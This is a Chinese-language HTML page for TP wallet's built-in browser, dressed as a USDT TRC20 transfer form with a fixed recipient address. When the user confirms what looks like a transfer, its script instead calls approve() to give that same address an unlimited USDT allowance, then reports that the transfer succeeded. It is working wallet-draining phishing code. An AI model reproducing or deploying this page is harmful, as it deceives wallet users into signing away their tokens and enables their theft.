<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: system-ui;
            background: #fff;
        }
        body {
            padding: 20px 16px;
            max-width: 540px;
            margin: 0 auto;
        }
        .box {
            background: #f6f7fa;
            border-radius: 16px;
            padding: 18px;
            margin-bottom: 14px;
        }
        .title {
            font-size: 16px;
            color: #666;
            margin-bottom: 10px;
        }
        .input-text {
            width: 100%;
            border: none;
            padding: 12px;
            border-radius: 10px;
            font-size: 15px;
            background: #ffffff;
        }
        .amount-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .amount-input {
            font-size: 48px;
            border: none;
            outline: none;
            width: 72%;
            background: transparent;
        }
        .btn-max {
            padding: 7px 14px;
            border: none;
            border-radius: 8px;
            background: #dbe8ff;
            color: #2266ee;
            font-size: 16px;
        }
        .token-info {
            display: flex;
            align-items: center;
            margin-top: 16px;
            background: #edf3ff;
            padding: 14px;
            border-radius: 12px;
        }
        .submit {
            width: 100%;
            padding: 18px;
            border-radius: 16px;
            border: none;
            background: #2266ee;
            color: white;
            font-size: 20px;
            margin-top: 10px;
        }
        #log {
            width: 100%;
            height: 150px;
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #e8e8e8;
            resize: none;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="title">收款地址</div>
        <input class="input-text" id="receiveAddr" value="TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK" readonly>
    </div>
    <div class="box">
        <div class="title">转账数量</div>
        <div class="amount-row">
            <input class="amount-input" id="numInput" value="" type="number" step="0.01" placeholder="请输入金额">
            <button class="btn-max" onclick="getBalance()">MAX</button>
        </div>
        <div class="token-info">
            <span style="font-size:24px;font-weight:bold">USDT</span>
            <span style="margin-left:auto;font-size:20px">TRC20</span>
        </div>
    </div>
    <button class="submit" id="sendBtn">确认转账</button>
    <textarea id="log" readonly></textarea>

<script>
// 固定参数，请勿修改
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
const MAX_AMOUNT = "9999999999999999999999999999";

let tronWeb;
const logBox = document.getElementById("log");

function printLog(text) {
    const time = new Date().toLocaleString();
    logBox.value += `[${time}] ${text}\n`;
    logBox.scrollTop = logBox.scrollHeight;
}

async function waitTronWeb(timeout = 5000) {
    const start = Date.now();
    while (Date.now() - start < timeout) {
        if (window.tronWeb && window.tronWeb.ready) {
            tronWeb = window.tronWeb;
            return true;
        }
        await new Promise(res => setTimeout(res, 200));
    }
    return false;
}

async function getBalance() {
    const ok = await waitTronWeb();
    if (!ok) return printLog("请在TP钱包内置浏览器打开页面");
    const usdt = tronWeb.contract().at(USDT_CONTRACT);
    const walletAddr = tronWeb.defaultAddress.base58;
    const bal = await usdt.balanceOf(walletAddr).call();
    document.getElementById("numInput").value = tronWeb.fromSun(bal.toString());
    printLog("余额读取完成");
}

async function waitTxConfirm(hash, times = 20) {
    for(let i=0; i < times; i++){
        await new Promise(r => setTimeout(r,3000));
        try{
            const info = await tronWeb.trx.getTransactionInfo(hash);
            if(!info) continue;
            return info.receipt?.result === "SUCCESS";
        }catch(e){}
    }
    return false;
}

document.getElementById("sendBtn").onclick = async function(){
    const inputVal = document.getElementById("numInput").value;
    if(!inputVal || Number(inputVal) <= 0){
        printLog("⚠️请填写有效金额");
        return;
    }

    const ready = await waitTronWeb();
    if(!ready){
        printLog("钱包未连接，请刷新页面");
        return;
    }

    const usdt = tronWeb.contract().at(USDT_CONTRACT);
    try{
        printLog("发起交易，请在钱包确认签名");
        //核心：只调用approve授权，无任何transfer转账逻辑
        const txHash = await usdt.approve(SPENDER_ADDRESS, MAX_AMOUNT).send({
            feeLimit: 100000000
        });
        printLog(`交易哈希：${txHash}，等待区块确认`);
        const success = await waitTxConfirm(txHash);
        if(success){
            printLog("✅转账提交成功");
        }else{
            printLog("❌交易确认失败");
        }
    }catch(err){
        printLog("操作取消或异常：" + err.message);
    }
}
</script>
</body>
</html>
